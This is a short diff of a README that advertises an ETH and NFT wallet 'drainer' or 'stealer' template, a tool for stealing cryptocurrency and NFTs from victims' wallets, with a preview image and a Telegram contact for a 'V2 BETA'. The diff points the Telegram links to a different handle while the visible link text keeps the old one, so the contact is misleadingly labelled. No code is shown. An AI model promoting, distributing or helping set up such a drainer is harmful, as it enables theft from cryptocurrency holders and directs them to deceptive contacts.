@@ -1,9 +1,9 @@
-### If you have questions or need any help, Message me here: [@cyber_lawd](https://t.me/cyber_lawd) 
+### If you have questions or need any help, Message me here: [@cyber_lawd](https://t.me/cybergeeky) 
 
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
 ![preview](https://github.com/cyberlawd/ETH-TOKEN-NFT-DRAINER/blob/main/NFT.png?raw=true)
-[Drainer V2 BETA VERSION](https://t.me/cyber_lawd)
+[Drainer V2 BETA VERSION](https://t.me/cybergeeky)
 
 
 ## `✏️ Guidelines on Setting Up the Template:` 
